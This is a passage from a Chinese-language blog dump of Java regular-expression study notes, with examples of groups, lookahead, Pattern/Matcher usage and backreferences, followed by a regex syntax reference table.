title=\"定位符\"></a>定位符</h4><p>定位符,规定要匹配的字符串出现的位置,比如在字符串的开始还是在结束的位置</p>\n<table>\n<thead>\n<tr>\n<th>符号</th>\n<th>含义</th>\n<th>示例</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>^</td>\n<td>指定起始字符</td>\n<td>^[0-9]+[a-z]*</td>\n<td>以至少1个数字开头,后接任意个小写字母的字符串</td>\n</tr>\n<tr>\n<td>$</td>\n<td>指定结束字符</td>\n<td>^[0-9]\\-[a-z]+$</td>\n<td>以1个数字开头后接连字符”-“,并以至少1个小写字母结尾的字符串</td>\n</tr>\n<tr>\n<td>\\b</td>\n<td>匹配目标字符串的边界</td>\n<td>er\\b</td>\n<td>匹配forev<code>er</code>中的er,但不匹配verb中的er</td>\n</tr>\n<tr>\n<td>\\B</td>\n<td>匹配目标字符串的非边界</td>\n<td>er\\B</td>\n<td>匹配v<code>er</code>b中的er,但不匹配forever中的er</td>\n</tr>\n</tbody></table>\n<h4 id=\"分组\"><a href=\"#分组\" class=\"headerlink\" title=\"分组\"></a>分组</h4><h5 id=\"pattern\"><a href=\"#pattern\" class=\"headerlink\" title=\"(pattern)\"></a>(pattern)</h5><p>非命名捕获,捕获匹配的子字符串,编号为0的第一个捕获是由整个正则表达式模式匹配的文本(即group(0)),其它捕获结果则根据左括号的顺序从1开始自动编号</p>\n<h5 id=\"lt-name-gt\"><a href=\"#lt-name-gt\" class=\"headerlink\" title=\"(?&lt;name&gt;)\"></a>(?&lt;name&gt;)</h5><p>命名捕获,将匹配的字符串捕获到一个组名称或编号名称中,用于name的字符串不能包含任何表单符号,并且不能以数字开头,可以使用单引号替代尖括号,例如(?’name’)</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.util.regex.Matcher;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.regex.Pattern;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">r1</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        String content=<span class=\"string\">&quot;dsfdsfds s7789 nn1189han&quot;</span>;</span><br><span class=\"line\"><span class=\"comment\">//      String regStr=&quot;^[0-9]+[a-z]+\\\\d+$&quot;;</span></span><br><span class=\"line\">        String regStr=<span class=\"string\">&quot;(?&lt;g1&gt;\\\\d\\\\d)(?&lt;g2&gt;\\\\d\\\\d)&quot;</span>;</span><br><span class=\"line\">        Pattern pattern=Pattern.compile(regStr);</span><br><span class=\"line\">        <span class=\"comment\">//创建一个匹配器对象</span></span><br><span class=\"line\">        Matcher matcher= pattern.matcher(content);</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (matcher.find()) &#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;找到：&quot;</span> + matcher.group(<span class=\"number\">0</span>)); <span class=\"comment\">// 2000</span></span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;分组1(根据组名): &quot;</span>+matcher.group(<span class=\"string\">&quot;g1&quot;</span>));</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;分组1: &quot;</span>+matcher.group(<span class=\"number\">1</span>));</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;分组2(根据组名): &quot;</span>+matcher.group(<span class=\"string\">&quot;g2&quot;</span>));</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;分组2: &quot;</span>+matcher.group(<span class=\"number\">2</span>));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20211207234020782.png\"></p>\n<h4 id=\"非捕获分组\"><a href=\"#非捕获分组\" class=\"headerlink\" title=\"非捕获分组\"></a>非捕获分组</h4><h5 id=\"pattern-1\"><a href=\"#pattern-1\" class=\"headerlink\" title=\"(?:pattern)\"></a>(?:pattern)</h5><p>非捕获分组不算入分组内,即不能通过group(i)去访问</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.util.regex.Matcher;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.regex.Pattern;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">r1</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        String content=<span class=\"string\">&quot;124张三男士  hell张三先生   张三同学  &quot;</span>;</span><br><span class=\"line\"><span class=\"comment\">//      String regStr=&quot;^[0-9]+[a-z]+\\\\d+$&quot;;</span></span><br><span class=\"line\">        String regStr=<span class=\"string\">&quot;张三(?:男士|先生|同学)&quot;</span>;<span class=\"comment\">//等价于:张三男士|张三先生|张三同学</span></span><br><span class=\"line\">        Pattern pattern=Pattern.compile(regStr);</span><br><span class=\"line\">        <span class=\"comment\">//创建一个匹配器对象</span></span><br><span class=\"line\">        Matcher matcher= pattern.matcher(content);</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (matcher.find()) &#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;找到：&quot;</span> + matcher.group(<span class=\"number\">0</span>)); <span class=\"comment\">// 2000</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20211208235406173.png\"></p>\n<h5 id=\"pattern-2\"><a href=\"#pattern-2\" class=\"headerlink\" title=\"(?=pattern)\"></a>(?=pattern)</h5><p>它是一个非捕获匹配,例如,”windows(?=95|98|NT|2000)”匹配”windows2000”中的”windows”,但不匹配”windows10”中的windows</p>\n<p>(理解这个等号的含义即可)</p>\n<h5 id=\"pattern-3\"><a href=\"#pattern-3\" class=\"headerlink\" title=\"(?!pattern)\"></a>(?!pattern)</h5><p>与上一个刚好相反,例如,”windows(?=95|98|NT|2000)”匹配”windows10”中的”windows”,但不匹配”windows2000”中的windows</p>\n<p>(理解!与=的相反含义)</p>\n<h4 id=\"匹配汉字\"><a href=\"#匹配汉字\" class=\"headerlink\" title=\"匹配汉字\"></a>匹配汉字</h4><p><code>resStr = &quot;^[\\u0391-\\uffe5]+$&quot;</code></p>\n<p>上面的regStr匹配纯汉字</p>\n<p>\\u0391-\\uffe5是汉字的编码范围</p>\n<p>一些练习:</p>\n<p>匹配1-9开头的六位数:  <code>^[1-9]\\\\d&#123;5&#125;$</code></p>\n<p>匹配必须以13,14,15,18开头的11位数: <code>^1[3458]\\\\d&#123;9&#125;$</code></p>\n<p>匹配小数或者整数 <code>^[-+]?([1-9]\\\\d*|0)(\\\\.\\\\d+)?$</code></p>\n<h3 id=\"三个常用类\"><a href=\"#三个常用类\" class=\"headerlink\" title=\"三个常用类\"></a>三个常用类</h3><h4 id=\"Pattern类\"><a href=\"#Pattern类\" class=\"headerlink\" title=\"Pattern类\"></a>Pattern类</h4><p>Pattern对象是一个正则表达式对象,Pattern类没有公共构造方法,(不需要new)要创建一个Pattern对象,调用其公共静态方法,它返回一个Pattern对象,该方法接受一个正则表达式作为它的第一个参数,比如</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Pattern p=Pattern.compile(regStr);</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"matches方法\"><a href=\"#matches方法\" class=\"headerlink\" title=\"matches方法\"></a>matches方法</h5><p>如果只是判断是否满足格式,可以使用Pattern的matches,整体匹配,比较简洁,返回一个bool值,但是只能整体匹配,不能分组</p>\n<p><code>Pattern.matches(regStr,content)</code></p>\n<h3 id=\"Matcher类\"><a href=\"#Matcher类\" class=\"headerlink\" title=\"Matcher类\"></a>Matcher类</h3><p>Matcher类是对输入字符进行解释和匹配的引擎,与Pattern类一样,Matcher也没有公共构造方法,需要调用Pattern对象的matcher方法来获得一个Matcher对象,比如</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Matcher matcher= pattern.matcher(content);</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"matcher-start-获取find每一组开始的索引\"><a href=\"#matcher-start-获取find每一组开始的索引\" class=\"headerlink\" title=\"matcher.start();获取find每一组开始的索引\"></a>matcher.start();获取find每一组开始的索引</h5><h5 id=\"matcher-end-获取find每一组尾部的索引\"><a href=\"#matcher-end-获取find每一组尾部的索引\" class=\"headerlink\" title=\"matcher.end();获取find每一组尾部的索引\"></a>matcher.end();获取find每一组尾部的索引</h5><h5 id=\"replaceAll-替换-注意该函数只是返回替换后的结果-并不修改原来conetent\"><a href=\"#replaceAll-替换-注意该函数只是返回替换后的结果-并不修改原来conetent\" class=\"headerlink\" title=\"replaceAll();//替换,注意该函数只是返回替换后的结果,并不修改原来conetent\"></a>replaceAll();//替换,注意该函数只是返回替换后的结果,并不修改原来conetent</h5><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class r1 &#123;</span><br><span class=\"line\">    public static void main(String[] args) &#123;</span><br><span class=\"line\">        String content=&quot;我确实是个傻缺&quot;;</span><br><span class=\"line\">//      String regStr=&quot;^[0-9]+[a-z]+\\\\d+$&quot;;</span><br><span class=\"line\">        String regStr=&quot;确实&quot;;</span><br><span class=\"line\">        Pattern pattern=Pattern.compile(regStr);</span><br><span class=\"line\">        //创建一个匹配器对象</span><br><span class=\"line\">        Matcher matcher= pattern.matcher(content);</span><br><span class=\"line\">        while (matcher.find()) &#123;</span><br><span class=\"line\">            String newContent=matcher.replaceAll(&quot;雀氏&quot;);</span><br><span class=\"line\">            System.out.println(newContent);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"PatternSyntaxException类\"><a href=\"#PatternSyntaxException类\" class=\"headerlink\" title=\"PatternSyntaxException类\"></a>PatternSyntaxException类</h3><p>PatternSyntaxException是一个非强制异常类,它表示一个正则表达式中的语法错误</p>\n<h4 id=\"分组-捕获-反向引用\"><a href=\"#分组-捕获-反向引用\" class=\"headerlink\" title=\"分组,捕获,反向引用\"></a>分组,捕获,反向引用</h4><p>1.分组</p>\n<p>我们可以用圆括号组成一个比较复杂的匹配模式,那么一个圆括号的部分我们可以看作是一个子表达式(一个分组)</p>\n<p>2.捕获</p>\n<p>把正则表达式中子表达式/分组匹配的内容,保存澡内存中以数字编号或显式命名的组里,方便后面引用,从左往右,以分组的左括号为标志,第一个为1,0代表整个表达式匹配内容</p>\n<p>3.<strong>反向引用</strong></p>\n<p>圆括号的内容被捕获偶,可以在这个括号后被引用,从而写出一个比较使用的匹配模式,这个称为反向引用,这种引用既可以是在正则表达式内部,<u>也可以是在正则表达式外部,内部反向引用用<code>\\\\分组号</code>,外部反向引用<code>$分组号</code></u></p>\n<p>例子,匹配回文数</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">String regStr=<span class=\"string\">&quot;(\\\\d)(\\\\d)\\\\2\\\\1&quot;</span>;</span><br></pre></td></tr></table></figure>\n\n<p>—应用示例:</p>\n<p>结巴程序:把 类似: “我….我要….学学学学….编程java!”   通过正则表达式修改为”我要学编程java!”</p>\n<p>思路:</p>\n<p>1.去掉所有的点</p>\n<p>2.去除所有重复字</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        String content=<span class=\"string\">&quot;我....我要....学学学学....编程java!&quot;</span>;</span><br><span class=\"line\">        <span class=\"comment\">//1.去掉所有的点</span></span><br><span class=\"line\">        String regStr=<span class=\"string\">&quot;\\\\.&quot;</span>;</span><br><span class=\"line\">        Pattern pattern=Pattern.compile(regStr);</span><br><span class=\"line\">        Matcher matcher= pattern.matcher(content);</span><br><span class=\"line\">        content=matcher.replaceAll(<span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">        System.out.println(content);</span><br><span class=\"line\">        <span class=\"comment\">//2去除所有重复字</span></span><br><span class=\"line\">        regStr=<span class=\"string\">&quot;(.)\\\\1+&quot;</span>;<span class=\"comment\">//只会匹配到1-多的字符串</span></span><br><span class=\"line\">        pattern=Pattern.compile(regStr);</span><br><span class=\"line\">        matcher=pattern.matcher((content));</span><br><span class=\"line\">        content=matcher.replaceAll(<span class=\"string\">&quot;$1&quot;</span>);<span class=\"comment\">//分组的表达式外引用</span></span><br><span class=\"line\">        System.out.println(content);</span><br><span class=\"line\">    \t<span class=\"comment\">//第2步的代码也可以用一行代码替换</span></span><br><span class=\"line\">        <span class=\"comment\">/*content=Pattern.compile(&quot;(.)\\\\1+&quot;).matcher(content).replaceAll(&quot;$1&quot;);</span></span><br><span class=\"line\"><span class=\"comment\">        System.out.println(content);</span></span><br><span class=\"line\"><span class=\"comment\">        */</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"String类中使用正则表达式\"><a href=\"#String类中使用正则表达式\" class=\"headerlink\" title=\"String类中使用正则表达式\"></a>String类中使用正则表达式</h4><p>String类中可以直接使用</p>\n<ol>\n<li><p>replaceAll()方法</p>\n</li>\n<li><p>matches()方法</p>\n</li>\n<li><p>分割功能    split()方法中可以使用正则表达式</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">r1</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        String content=<span class=\"string\">&quot;hello#abc-jack12smith~河南&quot;</span>;</span><br><span class=\"line\">        <span class=\"comment\">//要求按照#或-或~或数字来分割</span></span><br><span class=\"line\">        String[]spilt = content.split(<span class=\"string\">&quot;#|~|-|\\\\d+&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(String s : spilt)&#123;<span class=\"comment\">//类似于foreach</span></span><br><span class=\"line\">            System.out.println(s);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20211209124141204.png\"></p>\n</li>\n</ol>\n<h4 id=\"写正则表达式思路\"><a href=\"#写正则表达式思路\" class=\"headerlink\" title=\"写正则表达式思路\"></a>写正则表达式思路</h4><p>1.先写出一个简单的表达式,接着根据各种情况来逐渐完善</p>\n<p>2.如果遇到需要不匹配的内容,可以在()外对其进行匹配,并可以用标志性符号对其设置边界,比如url中的/</p>\n"},{"title":"java正则语法表","date":"2021-12-08T16:02:58.000Z","description":"java正则语法表","_content":"\n| 字符          | 说明                                                         |\n| :------------ | :----------------------------------------------------------- |\n| \\             | 将下一字符标记为特殊字符、文本、反向引用或八进制转义符。例如， **n**匹配字符 **n**。**\\n** 匹配换行符。序列 **\\\\\\\\** 匹配 **\\\\** ，**\\\\(** 匹配 **(**。 |\n| ^             | 匹配输入字符串开始的位置。如果设置了 **RegExp** 对象的 **Multiline** 属性，^ 还会与\"\\n\"或\"\\r\"之后的位置匹配。 |\n| $             | 匹配输入字符串结尾的位置。如果设置了 **RegExp** 对象的 **Multiline** 属性，$ 还会与\"\\n\"或\"\\r\"之前的位置匹配。 |\n| *             | 零次或多次匹配前面的字符或子表达式。例如，zo* 匹配\"z\"和\"zoo\"。* 等效于 {0,}。 |\n| +             | 一次或多次匹配前面的字符或子表达式。例如，\"zo+\"与\"zo\"和\"zoo\"匹配，但与\"z\"不匹配。+ 等效于 {1,}。 |\n| ?             | 零次或一次匹配前面的字符或子表达式。例如，\"do(es)?\"匹配\"do\"或\"does\"中的\"do\"。? 等效于 {0,1}。 |\n| {*n*}         | *n* 是非负整数。正好匹配 *n* 次。例如，\"o{2}\"与\"Bob\"中的\"o\"不匹配，但与\"food\"中的两个\"o\"匹配。 |\n| {*n*,}        | *n* 是非负整数。至少匹配 *n* 次。例如，\"o{2,}\"不匹配\"Bob\"中的\"o\"，而匹配\"foooood\"中的所有 o。\"o{1,}\"等效于\"o+\"。\"o{0,}\"等效于\"o*\"。 |\n| {*n*,*m*}     | *m* 和 *n* 是非负整数，其中 *n* <= *m*。匹配至少 *n* 次，至多 *m* 次。例如，\"o{1,3}\"匹配\"fooooood\"中的头三个 o。'o{0,1}' 等效于 'o?'。注意：您不能将空格插入逗号和数字之间。 |\n| ?             | 当此字符紧随任何其他限定符（*、+、?、{*n*}、{*n*,}、{*n*,*m*}）之后时，匹配模式是\"非贪心的\"。\"非贪心的\"模式匹配搜索到的、尽可能短的字符串，而默认的\"贪心的\"模式匹配搜索到的、尽可能长的字符串。例如，在字符串\"oooo\"中，\"o+?\"只匹配单个\"o\"，而\"o+\"匹配所有\"o\"。 |\n| .             | 匹配除\"\\r\\n\"之外的任何单个字符。若要匹配包括\"\\r\\n\"在内的任意字符，请使用诸如\"[\\s\\S]\"之类的模式。 |\n| (*pattern*)   | 匹配 *pattern* 并捕获该匹配的子表达式。可以使用 **$0…$9** 属性从结果\"匹配\"集合中检索捕获的匹配。若要匹配括号字符 ( )，请使用\"\\(\"或者\"\\)\"。 |\n| (?:*pattern*) | 匹配 *pattern* 但不捕获该匹配的子表达式，即它是一个非捕获匹配，不存储供以后使用的匹配。这对于用\"or\"字符 (\\|) 组合模式部件的情况很有用。例如，'industr(?:y\\|ies) 是比 'industry\\|industries' 更经济的表达式。 |\n| (?=*pattern*) | 执行正向预测先行搜索的子表达式，该表达式匹配处于匹配 *pattern* 的字符串的起始点的字符串。它是一个非捕获匹配，即不能捕获供以后使用的匹配。例如，'Windows (?=95\\|98\\|NT\\|2000)' 匹配\"Windows 2000\"中的\"Windows\"，但不匹配\"Windows 3.1\"中的\"Windows\"。预测先行不占用字符，即发生匹配后，下一匹配的搜索紧随上一匹配之后，而不是在组成预测先行的字符后。 |\n| (?!*pattern*) | 执行反向预测先行搜索的子表达式，该表达式匹配不处于匹配 *pattern* 的字符串的起始点的搜索字符串。它是一个非捕获匹配，即不能捕获供以后使用的匹配。例如，'Windows (?!95\\|98\\|NT\\|2000)' 匹配\"Windows 3.1\"中的 \"Windows\"，但不匹配\"Windows 2000\"中的\"Windows\"。预测先行不占用字符，即发生匹配后，下一匹配的搜索紧随上一匹配之后，而不是在组成预测先行的字符后。 |\n| *x*\\|*y*      | 匹配 *x* 或 *y*。例如，'z\\|food' 匹配\"z\"或\"food\"。'(z\\|f)ood' 匹配\"zood\"或\"food\"。 |\n| [*xyz*]       | 字符集。匹配包含的任一字符。例如，\"[abc]\"匹配\"plain\"中的\"a\"。 |\n| [^*xyz*]      | 反向字符集。匹配未包含的任何字符。例如，\"[^abc]\"匹配\"plain\"中\"p\"，\"l\"，\"i\"，\"n\"。 |\n| [*a-z*]       | 字符范围。匹配指定范围内的任何字符。例如，\"[a-z]\"匹配\"a\"到\"z\"范围内的任何小写字母。 |\n| [^*a-z*]      | 反向范围字符。匹配不在指定的范围内的任何字符。例如，\"[^a-z]\"匹配任何不在\"a\"到\"z\"范围内的任何字符。 |\n| \\b            | 匹配一个字边界，即字与空格间的位置。例如，\"er\\b\"匹配\"never\"中的\"er\"，但不匹配\"verb\"中的\"er\"。 |\n| \\B            | 非字边界匹配。\"er\\B\"匹配\"verb\"中的\"er\"，但不匹配\"never\"中的\"er\"。 |\n| \\c*x*         | 匹配 *x* 指示的控制字符。例如，\\cM 匹配 Control-M 或回车符。*x* 的值必须在 A-Z 或 a-z 之间。如果不是这样，则假定 c 就是\"c\"字符本身。 |\n| \\d            | 数字字符匹配。等效于 [0-9]。                                 |\n| \\D            | 非数字字符匹配。等效于 [^0-9]。                              |\n| \\f            | 换页符匹配。等效于 \\x0c 和 \\cL。                             |\n| \\n            | 换行符匹配。等效于 \\x0a 和 \\cJ。                             |\n| \\r            | 匹配一个回车符。等效于 \\x0d 和 \\cM。                         |\n| \\s            | 匹配任何空白字符，包括空格、制表符、换页符等。与 [ \\f\\n\\r\\t\\v] 等效。 |\n| \\S            | 匹配任何非空白字符。与 [^ \\f\\n\\r\\t\\v] 等效。                 |\n| \\t            | 制表符匹配。与 \\x09 和 \\cI 等效。                            |\n| \\v            | 垂直制表符匹配。与 \\x0b 和 \\cK 等效。                        |\n| \\w            | 匹配任何字类字符，包括下划线。与\"[A-Za-z0-9_]\"等效。         |\n| \\W            | 与任何非单词字符匹配。与\"[^A-Za-z0-9_]\"等效。                |\n| \\x*n*         | 匹配 *n*，此处的 *n* 是一个十六进制转义码。十六进制转义码必须正好是两位数长。例如，\"\\x41\"匹配\"A\"。\"\\x041\"与\"\\x04\"&\"1\"等效。允许在正则表达式中使用 ASCII 代码。 |\n| \\*num*        | 匹配 *num*，此处的 *num* 是一个正整数。到捕获匹配的反向引用。例如，\"(.)\\1\"匹配两个连续的相同字符。 |\n| \\*n*          | 标识一个八进制转义码或反向引用。如果 \\*n* 前面至少有 *n* 个捕获子表达式，那么 *n* 是反向引用。否则，如果 *n* 是八进制数 (0-7)，那么 *n* 是八进制转义码。 |\n| \\*nm*         | 标识一个八进制转义码或反向引用。如果 \\*nm* 前面至少有 *nm* 个捕获子表达式，那么 *nm* 是反向引用。如果 \\*nm* 前面至少有 *n* 个捕获，则 *n* 是反向引用，后面跟有字符 *m*。如果两种前面的情况都不存在，则 \\*nm* 匹配八进制值 *nm*，其中 *n* 和 *m* 是八进制数字 (0-7)。 |\n| \\nml          | 当 *n* 是八进制数 (0-3)，*m* 和 *l* 是八进制数 (0-7) 时，匹配八进制转义码 *nml*。 |\n| \\u*n*         | 匹配 *n*，其中 *n* 是以四位十六进制数表示的 Unicode 字符。例如，\\u00A9 匹配版权符号 (©)。 |\n","source":"_posts/java正则语法表.md","raw":"---\ntitle: java正则语法表\ndate: 2021-12-09 00:02:58\ntags:\n    - 正则表达式\n    - java\ncategories: 正则表达式\ndescription: java正则语法表\n---\n\n| 字符          | 说明                                                         |\n| :------------ | :----------------------------------------------------------- |\n| \\             | 将下一字符标记为特殊字符、文本、反向引用或八进制转义符。例如， **n**匹配字符 **n**。**\\n** 匹配换行符。序列 **\\\\\\\\** 匹配 **\\\\** ，**\\\\(** 匹配 **(**。 |\n| ^             | 匹配输入字符串开始的位置。如果设置了 **RegExp** 对象的 **Multiline** 属性，^ 还会与\"\\n\"或\"\\r\"之后的位置匹配。 |\n| $             | 匹配输入字符串结尾的位置。如果设置了 **RegExp** 对象的 **Multiline** 属性，$ 还会与\"\\n\"或\"\\r\"之前的位置匹配。 |\n| *             | 零次或多次匹配前面的字符或子表达式。例如，zo* 匹配\"z\"和\"zoo\"。* 等效于 {0,}。 |\n| +             | 一次或多次匹配前面的字符或子表达式。例如，\"zo+\"与\"zo\"和\"zoo\"匹配，但与\"z\"不匹配。+ 等效于 {1,}。 |\n| ?             | 零次或一次匹配前面的字符或子表达式。例如，\"do(es)?\"匹配\"do\"或\"does\"中的\"do\"。? 等效于 {0,1}。 |\n| {*n*}         | *n* 是非负整数。正好匹配 *n* 次。例如，\"o{2}\"与\"Bob\"中的\"o\"不匹配，但与\"food\"中的两个\"o\"匹配。 |\n| {*n*,}        | *n* 是非负整数。至少匹配 *n* 次。例如，\"o{2,}\"不匹配\"Bob\"中的\"o\"，而匹配\"foooood\"中的所有 o。\"o{1,}\"等效于\"o+\"。\"o{0,}\"等效于\"o*\"。 |\n| {*n*,*m*}     | *m* 和 *n* 是非负整数，其中 *n* <= *m*。匹配至少 *n* 次，至多 *m* 次。例如，\"o{1,3}\"匹配\"fooooood\"中的头三个 o。'o{0,1}' 等效于 'o?'。注意：您不能将空格插入逗号和数字之间。 |\n| ?             | 当此字符紧随任何其他限定符（*、+、?、{*n*}、{*n*,}、{*n*,*m*}）之后时，匹配模式是\"非贪心的\"。\"非贪心的\"模式匹配搜索到的、尽可能短的字符串，而默认的\"贪心的\"模式匹配搜索到的、尽可能长的字符串。例如，在字符串\"oooo\"中，\"o+?\"只匹配单个\"o\"，而\"o+\"匹配所有\"o\"。 |\n| .             | 匹配除\"\\r\\n\"之外的任何单个字符。若要匹配包括\"\\r\\n\"在内的任意字符，请使用诸如\"[\\s\\S]\"之类的模式。 |\n| (*pattern*)   | 匹配 *pattern* 并捕获该匹配的子表达式。可以使用 **$0…$9** 属性从结果\"匹配\"集合中检索捕获的匹配。若要匹配括号字符 ( )，请使用\"\\(\"或者\"\\)\"。 |\n| (?:*pattern*) | 匹配 *pattern* 但不捕获该匹配的子表达式，即它是一个非捕获匹配，不存储供以后使用的匹配。这对于用\"or\"字符 (\\|) 组合模式部件的情况很有用。例如，'industr(?:y\\|ies) 是比 'industry\\|industries' 更经济的表达式。 |\n| (?=*pattern*) | 执行正向预测先行搜索的子表达式，该表达式匹配处于匹配 *pattern* 的字符串的起始点的字符串。它是一个非捕获匹配，即不能捕获供以后使用的匹配。例如，'Windows (?=95\\|98\\|NT\\|2000)' 匹配\"Windows 2000\"中的\"Windows\"，但不匹配\"Windows 3.1\"中的\"Windows\"。预测先行不占用字符，即发生匹配后，下一匹配的搜索紧随上一匹配之后，而不是在组成预测先行的字符后。 |\n| (?!*pattern*) | 执行反向预测先行搜索的子表达式，该表达式匹配不处于匹配 *pattern* 的字符串的起始点的搜索字符串。它是一个非捕获匹配，即不能捕获供以后使用的匹配。例如，'Windows (?!95\\|98\\|NT\\|2000)' 匹配\"Windows 3.1\"中的 \"Windows\"，但不匹配\"Windows 2000\"中的\"Windows\"。预测先行不占用字符，即发生匹配后，下一匹配的搜索紧随上一匹配之后，而不是在组成预测先行的字符后。 |\n| *x*\\|*y*      | 匹配 *x* 或 *y*。例如，'z\\|food' 匹配\"z\"或\"food\"。'(z\\|f)ood' 匹配\"zood\"或\"food\"。 |\n| [*xyz*]       | 字符集。匹配包含的任一字符。例如，\"[abc]\"匹配\"plain\"中的\"a\"。 |\n| [^*xyz*]      | 反向字符集。匹配未包含的任何字符。例如，\"[^abc]\"匹配\"plain\"中\"p\"，\"l\"，\"i\"，\"n\"。 |\n| [*a-z*]       | 字符范围。匹配指定范围内的任何字符。例如，\"[a-z]\"匹配\"a\"到\"z\"范围内的任何小写字母。 |\n| [^*a-z*]      | 